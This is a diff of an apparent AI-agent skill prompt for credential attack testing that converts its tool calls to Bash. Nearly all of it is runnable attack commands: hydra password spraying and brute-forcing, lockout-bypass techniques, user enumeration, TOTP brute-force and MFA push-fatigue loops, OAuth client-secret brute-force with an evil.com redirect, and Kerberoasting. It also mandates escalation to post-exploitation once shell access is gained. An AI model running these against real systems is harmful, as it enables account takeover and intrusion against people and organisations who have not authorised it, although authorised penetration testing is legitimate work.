@@ -20,18 +20,18 @@ You are an expert credential security tester. Your goal: systematically test aut
 
 Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.
 
-| Trigger | Chain | Mandatory? | Claude Code | opencode |
-|---------|-------|-----------|-------------|---------|
-| After `session(action="complete")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` | `cat ~/.config/opencode/commands/gh-export.md` |
-| Credentials provide shell/RCE access to a system | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |
-| AD domain credentials found | `/ad-assessment` | OPTIONAL | `Skill(skill="ad-assessment")` | `cat ~/.config/opencode/commands/ad-assessment.md` |
-| Cloud credentials found | `/cloud-security` | OPTIONAL | `Skill(skill="cloud-security")` | `cat ~/.config/opencode/commands/cloud-security.md` |
+| Trigger | Chain | Mandatory? | Claude Code |
+|------|------|------|------|
+| After `Write("pentest/summary.md", "<summary>")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` |
+| Credentials provide shell/RCE access to a system | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` |
+| AD domain credentials found | `/ad-assessment` | OPTIONAL | `Skill(skill="ad-assessment")` |
+| Cloud credentials found | `/cloud-security` | OPTIONAL | `Skill(skill="cloud-security")` |
 
-**You WILL invoke `/gh-export` after `session(action="complete")`.**
+**You WILL invoke `/gh-export` after `Write("pentest/summary.md", "<summary>")`.**
 **If credentials yield shell access: MUST invoke `/post-exploit` — do not stop at credential confirmation.**
 
 
-**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.
+**Logging:** Before invoking any skill above, call `Bash("echo 'SKILL_CHAIN <skill> <reason> chained_from=<this>' >> pentest/skill_chain.log")` — this writes the SKILL_CHAIN entry to pentest.log.
 
 ---
 
@@ -41,13 +41,13 @@ When invoked from the pentester skill with discovered usernames, hashes, or cred
 
 1. **Parse the arguments** — extract: target IP/hostname, services list (e.g. `service=ssh,ftp,http`), user list path (e.g. `userlist=/tmp/discovered-users.txt`), and any context about how the material was discovered.
 
-2. **Load the discovered user list** (if provided) — read the file via `kali(command=...)` (`cat /tmp/discovered-users.txt`). These are **confirmed usernames** on the target system — they take priority over generic wordlists.
+2. **Load the discovered user list** (if provided) — read the file via `Bash(...)` (`cat /tmp/discovered-users.txt`). These are **confirmed usernames** on the target system — they take priority over generic wordlists.
 
 3. **If NO user list was provided**: run Phase 2.1 (platform-aware username expansion) IMMEDIATELY to build `/tmp/spray-users.txt`. This is critical — even without a discovered user list, the expanded list includes common first names and platform-specific accounts that catch weak credentials like `anne:princess` that generic shortlists miss entirely.
 
 4. **Expand the user list with mutations** — generate username variants from the discovered (or platform-generated) names:
    ```
-   kali(command="cat /tmp/discovered-users.txt | while read user; do echo $user; echo ${user,,}; echo ${user^^}; echo ${user^}; done | sort -u > /tmp/expanded-users.txt")
+   Bash("cat /tmp/discovered-users.txt | while read user; do echo $user; echo ${user,,}; echo ${user^^}; echo ${user^}; done | sort -u > /tmp/expanded-users.txt")
    ```
    Also try: first.last, flast, firstl, first, last (if full names are available).
 
@@ -68,17 +68,13 @@ When invoked from the pentester skill with discovered usernames, hashes, or cred
 
 | Tool | Use for |
 |------|---------|
-| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
-| `session(action="complete", options={...})` | Mark the scan done and write final notes |
-| `scan(tool="nuclei", ...)` | Default credential templates — fast check for known default logins |
-| `scan(tool="nmap", ...)` | Service detection — identify auth-enabled services |
-| `kali(command=...)` | Kali tools: hydra, john, ncrack, medusa, cewl, crunch, hashcat, netexec, kerbrute, impacket |
-| `http(action="request", ...)` | Raw HTTP — manual auth testing, cookie analysis, OAuth flows. Set `poc=True` for confirmed exploits |
-| `http(action="save_poc", ...)` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
-| `report(action="finding", data={...})` | Log a confirmed vulnerability with evidence to findings.json |
-| `report(action="diagram", data={...})` | Save a Mermaid diagram to findings.json |
-| `report(action="dashboard", data={"port": 5000})` | Serve dashboard.html at localhost:5000 |
-| `report(action="note", data={...})` | Write a reasoning note or decision to the session log |
+| `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
+| `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
+| `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
+| `Read` + `Write` `pentest/findings.json` | Append a confirmed vulnerability (with evidence) to `pentest/findings.json` — read, mutate the JSON array, write back. |
+| `Read` + `Write` `pentest/coverage.json` | Upsert an endpoint/test cell in the coverage matrix. |
+| `Bash("echo ... >> pentest/notes.log")` | Append a reasoning note or decision to the running session log. |
+| `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |
 
 ---
 
@@ -93,10 +89,10 @@ When invoked from the pentester skill with discovered usernames, hashes, or cred
 | **Default Credentials** | T1078.001 | `nuclei`, `hydra` |
 | **Credential in Files** | T1552.001 | `trufflehog`, `grep` |
 | **Kerberos Attacks** | T1558 | `impacket`, `kerbrute`, `john` |
-| **MFA Bypass** | T1111 | `http(action="request", ...)`, manual |
-| **OAuth/OIDC Abuse** | T1550.001 | `http(action="request", ...)`, `kali(command=...)` |
-| **Timing Enumeration** | T1589.001 | `http(action="request", ...)`, `kali(command=...)` |
-| **Session Token Analysis** | T1539 | `kali(command=...)`, `http(action="request", ...)` |
+| **MFA Bypass** | T1111 | `Bash("curl ...")`, manual |
+| **OAuth/OIDC Abuse** | T1550.001 | `Bash("curl ...")`, `Bash(...)` |
+| **Timing Enumeration** | T1589.001 | `Bash("curl ...")`, `Bash(...)` |
+| **Session Token Analysis** | T1539 | `Bash(...)`, `Bash("curl ...")` |
 
 ---
 
@@ -126,9 +122,9 @@ If depth/service is unspecified, ask:
 
 ### Phase 0 — Scope & Setup
 
-0. `session(action="start", options={...})` with target, depth, limits
-1. `report(action="dashboard", data={"port": 5000})`
-2. `report(action="note", data={...})` — record target services, known usernames, auth mechanisms
+0. `Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` with target, depth, limits
+1. `# (no dashboard — see pentest/findings.json directly)`
+2. `Bash("echo '<message>' >> pentest/notes.log")` — record target services, known usernames, auth mechanisms
 
 ---
 
@@ -136,12 +132,12 @@ If depth/service is unspecified, ask:
 
 1. **Identify auth services**:
    ```
-   scan(tool="nmap", target=HOST, options={"ports": "21,22,23,25,80,88,110,143,389,443,445,636,993,1433,3306,3389,5432,5900,6379,8080,8443,27017"})
+   Bash("nmap ...")
    ```
 
-2. **Probe web auth** via `http(action="request", ...)`: find login pages, identify auth type (form/basic/bearer/OAuth/SAML), check for CAPTCHA, note error messages ("Invalid username" vs "Invalid credentials" = user enumeration)
+2. **Probe web auth** via `Bash("curl ...")`: find login pages, identify auth type (form/basic/bearer/OAuth/SAML), check for CAPTCHA, note error messages ("Invalid username" vs "Invalid credentials" = user enumeration)
 
-3. `report(action="note", data={...})` + `report(action="diagram", data={...})` with auth architecture (login form, auth service, DB, LDAP, MFA, OAuth paths)
+3. `Bash("echo '<message>' >> pentest/notes.log")` + `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with auth architecture (login form, auth service, DB, LDAP, MFA, OAuth paths)
 
 ---
 
@@ -153,19 +149,19 @@ Test empty passwords before anything else. Misconfigured services (SSH `PermitEm
 
 ```
 # SSH — empty password for common service accounts
-kali(command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' TARGET ssh -t 4 -W 3")
+Bash("hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' TARGET ssh -t 4 -W 3")
 # If discovered usernames exist, test those too
-kali(command="hydra -L /tmp/discovered-users.txt -p '' TARGET ssh -t 4 -W 3")
+Bash("hydra -L /tmp/discovered-users.txt -p '' TARGET ssh -t 4 -W 3")
 # MySQL — root with no password
-kali(command="hydra -l root -p '' TARGET mysql -t 4")
+Bash("hydra -l root -p '' TARGET mysql -t 4")
 # PostgreSQL — postgres with no password
-kali(command="hydra -l postgres -p '' TARGET postgres -t 4")
+Bash("hydra -l postgres -p '' TARGET postgres -t 4")
 # FTP — common accounts with empty password
-kali(command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' TARGET ftp -t 4")
+Bash("hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' TARGET ftp -t 4")
 # Redis — no auth
-kali(command="redis-cli -h TARGET ping")
+Bash("redis-cli -h TARGET ping")
 # MongoDB — no auth
-kali(command="mongosh --host TARGET --eval 'db.adminCommand({listDatabases:1})'")
+Bash("mongosh --host TARGET --eval 'db.adminCommand({listDatabases:1})'")
 ```
 
 Report any empty-password login as **Critical** — it's zero-effort access.
@@ -175,13 +171,13 @@ Report any empty-password login as **Critical** — it's zero-effort access.
 When invoked WITHOUT a `userlist=` argument, build a comprehensive username list from multiple sources before testing:
 
 ```
-kali(command="cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt > /tmp/spray-users.txt")
+Bash("cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt > /tmp/spray-users.txt")
 ```
 
 Then append platform-specific usernames based on detected OS/service banners. **These are common examples** — always supplement with SecLists username wordlists for broader coverage:
 
 ```
-kali(command="cat /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt | head -500 >> /tmp/spray-users.txt")
+Bash("cat /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt | head -500 >> /tmp/spray-users.txt")
 ```
 
 | Banner contains | Append usernames (examples) |
@@ -197,14 +193,14 @@ kali(command="cat /usr/share/seclists/Usernames/xato-net-10-million-usernames-du
 | Any SSH | Use SecLists names: `/usr/share/seclists/Usernames/Names/names.txt` |
 
 ```
-kali(command="printf 'anne\njohn\nmary\njames\n...\n' >> /tmp/spray-users.txt && sort -u /tmp/spray-users.txt -o /tmp/spray-users.txt")
+Bash("printf 'anne\njohn\nmary\njames\n...\n' >> /tmp/spray-users.txt && sort -u /tmp/spray-users.txt -o /tmp/spray-users.txt")
 ```
 
 Use `/tmp/spray-users.txt` as the user list for all Phase 2 and Phase 6 commands. This ensures common first names (like `anne`) are tested even when no explicit user list has been discovered.
 
 **2.2 — Default credential wordlists:**
 
-Run `scan(tool="nuclei", target=URL, options={"templates": "default-login"})` in parallel with service-specific defaults:
+Run `Bash("nuclei ...")` in parallel with service-specific defaults:
 
 | Service | Command |
 |---------|---------|
@@ -243,7 +239,7 @@ Determine exact lockout threshold via binary search before spraying.
 
 **Lockout duration**: after triggering, test at 1min, 5min, 15min, 30min intervals:
 ```
-kali(command="sleep 60 && curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/login -d 'user=testuser&pass=wrong'")
+Bash("sleep 60 && curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/login -d 'user=testuser&pass=wrong'")
 ```
 
 **Bypass techniques**: IP rotation, username case variation (`Admin`/`admin`/`ADMIN`), Unicode normalization (`adm\u0131n`), concurrent requests before counter increments, different auth endpoints (`/login` vs `/api/auth` may not share lockout state).
@@ -258,12 +254,12 @@ Valid usernames trigger password hash comparison (slow); invalid usernames retur
 
 1. **Baseline** — 10 requests with known-invalid usernames:
    ```
-   kali(command="for i in $(seq 1 10); do curl -s -o /dev/null -w '%{time_total}\n' -X POST https://TARGET/login -d 'user=definitelynotauser_$i&pass=wrongpass'; done")
+   Bash("for i in $(seq 1 10); do curl -s -o /dev/null -w '%{time_total}\n' -X POST https://TARGET/login -d 'user=definitelynotauser_$i&pass=wrongpass'; done")
    ```
 
 2. **Test candidates** — 3 samples each:
    ```
-   kali(command="for user in admin root administrator operator service backup; do echo -n \"$user: \"; for i in 1 2 3; do curl -s -o /dev/null -w '%{time_total} ' -X POST https://TARGET/login -d \"user=$user&pass=wrongpass\"; done; echo; done")
+   Bash("for user in admin root administrator operator service backup; do echo -n \"$user: \"; for i in 1 2 3; do curl -s -o /dev/null -w '%{time_total} ' -X POST https://TARGET/login -d \"user=$user&pass=wrongpass\"; done; echo; done")
    ```
 
 3. **Analysis**: discard first request (cold cache). Consistent > 2x baseline = valid user.
@@ -285,7 +281,7 @@ Add confirmed users to `/tmp/valid-users.txt` for spraying.
 When you have discovered usernames, these are your highest-priority password candidates — many users set passwords based on their own username:
 
 ```
-kali(command="cat /tmp/discovered-users.txt | while read u; do
+Bash("cat /tmp/discovered-users.txt | while read u; do
   echo ''
   echo \"$u\"
   echo \"${u^}\"
@@ -314,19 +310,19 @@ done | sort -u > /tmp/username-passwords.txt")
 
 Run this against ALL services before moving to generic wordlists:
 ```
-kali(command="hydra -L /tmp/discovered-users.txt -P /tmp/username-passwords.txt TARGET ssh -t 4 -W 3")
-kali(command="hydra -L /tmp/discovered-users.txt -P /tmp/username-passwords.txt TARGET ftp -t 4 -W 3")
+Bash("hydra -L /tmp/discovered-users.txt -P /tmp/username-passwords.txt TARGET ssh -t 4 -W 3")
+Bash("hydra -L /tmp/discovered-users.txt -P /tmp/username-passwords.txt TARGET ftp -t 4 -W 3")
 ```
 
 Also test **each username as its own password** (identity spray):
 ```
-kali(command="hydra -C <(paste -d: /tmp/discovered-users.txt /tmp/discovered-users.txt) TARGET ssh -t 4")
+Bash("hydra -C <(paste -d: /tmp/discovered-users.txt /tmp/discovered-users.txt) TARGET ssh -t 4")
 ```
 
 1. **CeWL**: `cewl TARGET -d 2 -m 5 -w /tmp/cewl-words.txt --count`
 2. **John best64 rules** (64 most effective mutations — append digits, toggle case, reverse):
    ```
-   kali(command="john --wordlist=/tmp/cewl-words.txt --rules=best64 --stdout | head -5000 > /tmp/mutated.txt")
+   Bash("john --wordlist=/tmp/cewl-words.txt --rules=best64 --stdout | head -5000 > /tmp/mutated.txt")
    ```
    | Rule | What it does | When to use |
    |------|-------------|-------------|
@@ -339,9 +335,9 @@ kali(command="hydra -C <(paste -d: /tmp/discovered-users.txt /tmp/discovered-use
 4. **Mask attacks** — corporate password patterns:
    ```
    # Company+Year+Char: Company2024!
-   kali(command="for word in $(head -5 /tmp/cewl-words.txt); do for year in 2023 2024 2025 2026; do for c in '!' '@' '#' ''; do echo \"${word^}${year}${c}\"; done; done; done > /tmp/masks.txt")
+   Bash("for word in $(head -5 /tmp/cewl-words.txt); do for year in 2023 2024 2025 2026; do for c in '!' '@' '#' ''; do echo \"${word^}${year}${c}\"; done; done; done > /tmp/masks.txt")
    # Season+Year: Summer2024!, Winter2025@
-   kali(command="for s in Spring Summer Autumn Winter Fall; do for y in 2024 2025 2026; do for c in '!' '@' '#' ''; do echo \"${s}${y}${c}\"; done; done; done >> /tmp/masks.txt")
+   Bash("for s in Spring Summer Autumn Winter Fall; do for y in 2024 2025 2026; do for c in '!' '@' '#' ''; do echo \"${s}${y}${c}\"; done; done; done >> /tmp/masks.txt")
    ```
 5. **Leetspeak**: `sed 's/a/@/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/$/g'` on CeWL output
 6. **Merge all**: `cat /tmp/mutated.txt /tmp/masks.txt /tmp/leet.txt /tmp/keyboard-walks.txt | sort -u > /tmp/final-wordlist.txt`
@@ -354,13 +350,13 @@ kali(command="hydra -C <(paste -d: /tmp/discovered-users.txt /tmp/discovered-use
 
 **Single-service spray** (respect lockout threshold from Phase 3):
 ```
-kali(command="hydra -L /tmp/valid-users.txt -p 'Password123!' TARGET ssh -t 2 -W 5")
-kali(command="nxc smb TARGET -u /tmp/valid-users.txt -p 'Company2024!' --continue-on-success")
+Bash("hydra -L /tmp/valid-users.txt -p 'Password123!' TARGET ssh -t 2 -W 5")
+Bash("nxc smb TARGET -u /tmp/valid-users.txt -p 'Company2024!' --continue-on-success")
 ```
 
 **Cross-service automation** — when creds found on one service, test all others:
 ```
-kali(command="echo '--- SMB ---' && nxc smb TARGET -u founduser -p 'foundpass'; \
+Bash("echo '--- SMB ---' && nxc smb TARGET -u founduser -p 'foundpass'; \
   echo '--- RDP ---' && nxc rdp TARGET -u founduser -p 'foundpass'; \
   echo '--- SSH ---' && nxc ssh TARGET -u founduser -p 'foundpass'; \
   echo '--- WINRM ---' && nxc winrm TARGET -u founduser -p 'foundpass'; \
@@ -370,12 +366,12 @@ kali(command="echo '--- SMB ---' && nxc smb TARGET -u founduser -p 'foundpass'; 
 
 **Multi-host multi-protocol sweep:**
 ```
-kali(command="for proto in smb rdp ssh winrm mssql; do echo \"=== $proto ===\"; nxc $proto TARGET_RANGE -u /tmp/valid-users.txt -p 'Password123!' --continue-on-success 2>&1 | grep -E '\\+|SUCCESS'; done")
+Bash("for proto in smb rdp ssh winrm mssql; do echo \"=== $proto ===\"; nxc $proto TARGET_RANGE -u /tmp/valid-users.txt -p 'Password123!' --continue-on-success 2>&1 | grep -E '\\+|SUCCESS'; done")
 ```
 
 **Services not in netexec**: use hydra for PostgreSQL (`postgres`), Oracle (`oracle-listener`), HTTP Basic (`http-get /admin`), HTTP POST form.
 
-Call `report(action="finding", data={...})` immediately for every working credential pair.
+Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` immediately for every working credential pair.
 
 ---
 
@@ -397,17 +393,17 @@ Call `report(action="finding", data={...})` immediately for every working creden
 **Key commands:**
 ```
 # Technique 1: omit OTP field entirely
-http(action="request", url="https://TARGET/api/auth/verify", method="POST", body={"username": "user", "password": "pass"})
+Bash("curl ...")
 
 # Technique 3: TOTP brute-force
-kali(command="for code in $(seq -w 000000 000100); do RESP=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/api/verify-mfa -d \"{\\\"code\\\":\\\"$code\\\"}\" -H 'Content-Type: application/json' -H 'Cookie: session=TOKEN'); echo \"$code: $RESP\"; [ \"$RESP\" = \"200\" ] && break; done")
+Bash("for code in $(seq -w 000000 000100); do RESP=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/api/verify-mfa -d \"{\\\"code\\\":\\\"$code\\\"}\" -H 'Content-Type: application/json' -H 'Cookie: session=TOKEN'); echo \"$code: $RESP\"; [ \"$RESP\" = \"200\" ] && break; done")
 
 # Technique 5: push fatigue
-kali(command="for i in $(seq 1 20); do curl -s -X POST https://TARGET/api/push-mfa -d '{\"username\":\"target_user\"}' -H 'Content-Type: application/json'; sleep 3; done")
+Bash("for i in $(seq 1 20); do curl -s -X POST https://TARGET/api/push-mfa -d '{\"username\":\"target_user\"}' -H 'Content-Type: application/json'; sleep 3; done")
 
 # Technique 6: session reuse after logout
-http(action="request", url="https://TARGET/api/logout", method="POST", headers={"Cookie": "session=MFA_TOKEN"})
-http(action="request", url="https://TARGET/api/dashboard", method="GET", headers={"Cookie": "session=MFA_TOKEN"})
+Bash("curl ...")
+Bash("curl ...")
 ```
 
 ---
@@ -417,11 +413,11 @@ http(action="request", url="https://TARGET/api/dashboard", method="GET", headers
 **Grant type confusion** — test if server accepts unintended grants:
 ```
 # ROPC (should be disabled): bypasses user interaction
-http(action="request", url="https://TARGET/oauth/token", method="POST", body={"grant_type": "password", "username": "admin", "password": "admin", "client_id": "CLIENT_ID"})
+Bash("curl ...")
 # client_credentials: may issue tokens without user context
-http(action="request", url="https://TARGET/oauth/token", method="POST", body={"grant_type": "client_credentials", "client_id": "CLIENT_ID", "client_secret": "SECRET"})
+Bash("curl ...")
 # implicit (deprecated): direct token in URL fragment
-http(action="request", url="https://TARGET/oauth/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=https://evil.com/cb&scope=openid", method="GET")
+Bash("curl ...")
 ```
 
 **Scope escalation** — request privileged scopes: `scope=openid+profile+admin+write+users:manage`
@@ -439,7 +435,7 @@ http(action="request", url="https://TARGET/oauth/authorize?response_type=token&c
 
 **Client secret brute-force:**
 ```
-kali(command="for s in $(cat /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt); do R=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/oauth/token -d \"grant_type=client_credentials&client_id=CID&client_secret=$s\"); echo \"$s: $R\"; [ \"$R\" = \"200\" ] && break; done")
+Bash("for s in $(cat /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt); do R=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://TARGET/oauth/token -d \"grant_type=client_credentials&client_id=CID&client_secret=$s\"); echo \"$s: $R\"; [ \"$R\" = \"200\" ] && break; done")
 ```
 
 **Token exchange abuse (RFC 8693)** — exchange user token for admin-scoped token via `grant_type=urn:ietf:params:oauth:grant-type:token-exchange`
@@ -450,12 +446,12 @@ kali(command="for s in $(cat /usr/share/seclists/Passwords/Common-Credentials/to
 
 1. **Collect 20+ tokens**: login repeatedly, extract from Set-Cookie headers:
    ```
-   kali(command="for i in $(seq 1 20); do curl -s -D - -X POST https://TARGET/login -d 'user=test&pass=test' | grep -i 'set-cookie' | sed 's/.*session=//; s/;.*//'; done > /tmp/tokens.txt")
+   Bash("for i in $(seq 1 20); do curl -s -D - -X POST https://TARGET/login -d 'user=test&pass=test' | grep -i 'set-cookie' | sed 's/.*session=//; s/;.*//'; done > /tmp/tokens.txt")
    ```
 
 2. **Shannon entropy**:
    ```
-   kali(command="python3 -c \"
+   Bash("python3 -c \"
 import math, collections
 tokens = open('/tmp/tokens.txt').read().strip().split('\n')
 for t in tokens[:5]:
@@ -468,7 +464,7 @@ for t in tokens[:5]:
 
 3. **Sequential pattern detection**:
    ```
-   kali(command="python3 -c \"
+   Bash("python3 -c \"
 tokens = open('/tmp/tokens.txt').read().strip().split('\n')
 try:
     nums = [int(t,16) for t in tokens]
@@ -489,13 +485,13 @@ if len(prefixes) < len(tokens)/2: print('WARNING: shared prefixes — timestamp-
 
 **AS-REP Roasting** — accounts without pre-authentication:
 ```
-kali(command="impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /tmp/valid-users.txt -format hashcat -outputfile /tmp/asrep.txt")
-kali(command="john --wordlist=/tmp/final-wordlist.txt --format=krb5asrep /tmp/asrep.txt && john --show /tmp/asrep.txt")
+Bash("impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /tmp/valid-users.txt -format hashcat -outputfile /tmp/asrep.txt")
+Bash("john --wordlist=/tmp/final-wordlist.txt --format=krb5asrep /tmp/asrep.txt && john --show /tmp/asrep.txt")
 ```
 
 **Kerberoasting** — extract TGS hashes for service accounts (requires any valid domain cred):
 ```
-kali(command="impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile /tmp/kerberoast.txt")
+Bash("impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile /tmp/kerberoast.txt")
 ```
 - `$krb5tgs$23$` = RC4 (fast to crack, prioritize)
 - `$krb5tgs$18$` = AES256 (slow, deprioritize)
@@ -512,7 +508,7 @@ kali(command="impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outpu
 
 **Kerbrute enumeration** (no account required):
 ```
-kali(command="kerbrute userenum --dc DC_IP -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt --output /tmp/kerbrute-valid.txt 2>&1 | tail -20")
+Bash("kerbrute userenum --dc DC_IP -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt --output /tmp/kerbrute-valid.txt 2>&1 | tail -20")
 ```
 
 ---
@@ -536,18 +532,18 @@ kali(command="kerbrute userenum --dc DC_IP -d DOMAIN /usr/share/seclists/Usernam
 
 For every confirmed finding:
 
-1. `report(action="note", data={...})` — what was confirmed
+1. `Bash("echo '<message>' >> pentest/notes.log")` — what was confirmed
 2. Verify access — actually log in with discovered credentials
-3. `http(action="request", options={"poc": true})` for web findings
-4. `http(action="save_poc", ...)` with descriptive title (e.g., `default-creds-admin`, `mfa-bypass-param-removal`, `oauth-scope-escalation`)
-5. `report(action="finding", data={...})` — severity: Critical (admin/MFA bypass), High (user access/OAuth abuse), Medium (weak tokens/enumeration), Low (best practice gaps)
+3. `Bash("curl ...")` for web findings
+4. `Write("pocs/<title>.http", ...)` with descriptive title (e.g., `default-creds-admin`, `mfa-bypass-param-removal`, `oauth-scope-escalation`)
+5. `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` — severity: Critical (admin/MFA bypass), High (user access/OAuth abuse), Medium (weak tokens/enumeration), Low (best practice gaps)
 
 ---
 
 ### Phase 13 — Report & Wrap-Up
 
-1. `report(action="diagram", data={...})` — credential attack surface diagram
-2. `report(action="note", data={...})` with summary:
+1. `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` — credential attack surface diagram
+2. `Bash("echo '<message>' >> pentest/notes.log")` with summary:
 ```
 Credential Audit Summary:
   Default credentials:    [count] services — [findings]
@@ -561,7 +557,7 @@ Credential Audit Summary:
   Hash cracking:          [total] hashes — [cracked] cracked
   Kerberos:               [AS-REP/Kerberoast] — [findings]
 ```
-3. `session(action="complete", options={...})`
+3. `Write("pentest/summary.md", "<summary>")`
 4. Invoke `/gh-export`
 
 ---
@@ -584,23 +580,23 @@ Credential Audit Summary:
 | `/post-exploit` | Valid credentials obtained — post-exploitation and lateral movement |
 | `/lateral-movement` | Credentials work across multiple services — test lateral movement paths |
 | `/analyze-cve` | Auth library has a known CVE — trace exploitability |
-| `/gh-export` | Always — after `session(action="complete", options={...})` |
+| `/gh-export` | Always — after `Write("pentest/summary.md", "<summary>")` |
 
 ---
 
 ## Rules
 
-- **`session(action="start", options={...})` is mandatory** — never run any other tool before it
+- **`Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` is mandatory** — never run any other tool before it
 - **Batch independent tools in the same response** — they execute in parallel
-- When any tool returns a LIMIT message, stop immediately and call `session(action="complete", options={...})`
+- When any tool returns a LIMIT message, stop immediately and call `Write("pentest/summary.md", "<summary>")`
 - **Detect lockout threshold BEFORE spraying** — binary search (Phase 3), then use `threshold - 1`
 - **Start with default credentials** — always test vendor defaults before brute-force
 - **Build custom wordlists** — cewl + john rules + mask attacks beat generic wordlists
 - **Spray over brute-force** — 2 passwords x 1000 users beats 1000 passwords x 1 user
 - **Test credential reuse cross-service** — every found credential pair must hit all discovered services
-- **Call `report(action="finding", data={...})` for every confirmed credential** — include service, username, verified access
-- **For every confirmed exploit**: call `http(action="request", options={"poc": true})` AND `http(action="save_poc", ...)`
-- **Use `report(action="note", data={...})` liberally** — document reasoning for wordlist choices and attack strategy
+- **Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` for every confirmed credential** — include service, username, verified access
+- **For every confirmed exploit**: call `Bash("curl ...")` AND `Write("pocs/<title>.http", ...)`
+- **Use `Bash("echo '<message>' >> pentest/notes.log")` liberally** — document reasoning for wordlist choices and attack strategy
 - **Never fabricate findings** — only report credentials you actually verified
 - **Mermaid syntax rules**: `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
-- Call `session(action="stop_kali")` at the end if `kali(command=...)` was used
+- Call `# (no-op — tools native on Kali)` at the end if `Bash(...)` was used
